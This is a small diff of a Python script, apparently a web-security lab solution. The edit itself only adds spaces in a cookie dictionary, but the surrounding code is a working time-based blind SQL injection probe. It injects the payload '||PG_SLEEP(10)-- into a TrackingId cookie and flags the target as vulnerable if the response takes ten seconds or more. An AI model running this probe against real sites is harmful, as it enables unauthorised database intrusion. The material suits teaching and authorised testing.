@@ -10,8 +10,8 @@ def injection(url, trackingId, session):
   payload = "'||PG_SLEEP(10)--"
   payload = urllib.parse.quote_plus(payload)
   cookies = {
-    "TrackingId":trackingId + payload,
-    "session":session
+    "TrackingId": trackingId + payload,
+    "session": session
     }
   r = requests.get(url, cookies = cookies)
   if int(r.elapsed.total_seconds()) >= 10:
